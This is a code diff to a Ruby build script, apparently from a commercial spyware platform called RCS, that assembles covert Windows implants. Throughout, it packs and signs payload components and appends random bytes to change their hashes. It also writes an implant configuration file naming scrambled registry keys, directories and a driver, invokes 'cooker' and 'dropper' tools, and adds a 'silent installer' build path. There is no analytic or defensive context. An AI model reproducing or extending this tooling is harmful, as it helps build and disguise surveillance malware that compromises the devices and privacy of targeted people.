@@ -118,7 +118,7 @@ class BuildWindows < Build
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
 
     # add random bytes to codec, rapi and sqlite
-    add_random(path('codec'))
+    CrossPlatform.exec path('packer32'), "#{path('codec')}"
     add_random(path('rapi'))
     add_random(path('sqlite'))
 
@@ -166,44 +166,6 @@ class BuildWindows < Build
     if params['input']
       FileUtils.mv Config.instance.temp(params['input']), path('input')
       executable = path('input')
-    end
-
-    if params['cooked'] == true
-      @cooked = true
-      key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
-
-      # write the ini file
-      File.open(path('RCS.ini'), 'w') do |f|
-        f.puts "[RCS]"
-        f.puts "HUID=#{@factory.ident}"
-        f.puts "HCORE=#{@scrambled[:core]}"
-        f.puts "HCONF=#{@scrambled[:config]}"
-        f.puts "CODEC=#{@scrambled[:codec]}"
-        f.puts "DLL64=#{@scrambled[:core64]}"
-
-        # TODO: driver removal
-        f.puts "HDRV=null"
-        f.puts "DRIVER64=null"
-
-        #f.puts "HDRV=#{@scrambled[:driver]}"
-        #f.puts "DRIVER64=#{@scrambled[:driver64]}"
-
-        f.puts "HDIR=#{@scrambled[:dir]}"
-        f.puts "HREG=#{@scrambled[:reg]}"
-        f.puts "HOLDDIR=#{@scrambled[:olddir]}"
-        f.puts "HOLDREG=#{@scrambled[:oldreg]}"
-        f.puts "HSYS=ndisk.sys"
-        f.puts "HKEY=#{key}"
-        f.puts "MANIFEST=" + ((params['admin'] == true) ? 'yes' : 'no')
-        f.puts "FUNC=" + @funcname
-      end
-
-      cook_param = '-C -R ' + path('') + ' -O ' + path('output')
-      cook_param += " -d #{path('demo_image')}" if @demo
-
-      CrossPlatform.exec path('cooker'), cook_param
-
-    else
 
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                           (bit64 ? path(@scrambled[:core64]) : 'null') +' '+
@@ -222,6 +184,21 @@ class BuildWindows < Build
                                           (@demo ? path('demo_image') : 'null') +' '+
                                           executable + ' ' +
                                           path('output')
+    else
+      # we have to create a silent installer
+      cook(params['admin'])
+      File.exist? path('output') || raise("output file not created")
+
+      cooked = File.open(path('output'), 'rb') {|f| f.read}
+      File.open(path('silent'), 'ab+') {|f| f.write cooked}
+      FileUtils.rm_rf path('output')
+      FileUtils.cp path('silent'), path('output')
+    end
+
+    # this is a build for the NI
+    if params['cooked'] == true
+      @cooked = true
+      cook(params['admin'])
     end
 
     File.exist? path('output') || raise("output file not created")
@@ -293,6 +270,36 @@ class BuildWindows < Build
   end
 
   private
+
+  def cook(admin)
+    key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
+
+    # write the ini file
+    File.open(path('RCS.ini'), 'w') do |f|
+      f.puts "[RCS]"
+      f.puts "HUID=#{@factory.ident}"
+      f.puts "HCORE=#{@scrambled[:core]}"
+      f.puts "HCONF=#{@scrambled[:config]}"
+      f.puts "CODEC=#{@scrambled[:codec]}"
+      f.puts "DLL64=#{@scrambled[:core64]}"
+
+      # TODO: driver removal (just comment them here)
+      #f.puts "HDRV=#{@scrambled[:driver]}"
+      #f.puts "DRIVER64=#{@scrambled[:driver64]}"
+
+      f.puts "HDIR=#{@scrambled[:dir]}"
+      f.puts "HREG=#{@scrambled[:reg]}"
+      f.puts "HSYS=ndisk.sys"
+      f.puts "HKEY=#{key}"
+      f.puts "MANIFEST=" + (admin == true ? 'yes' : 'no')
+      f.puts "FUNC=" + @funcname
+    end
+
+    cook_param = '-C -R ' + path('') + ' -O ' + path('output')
+    cook_param += " -d #{path('demo_image')}" if @demo
+
+    CrossPlatform.exec path('cooker'), cook_param
+  end
 
   def add_random(file)
     File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
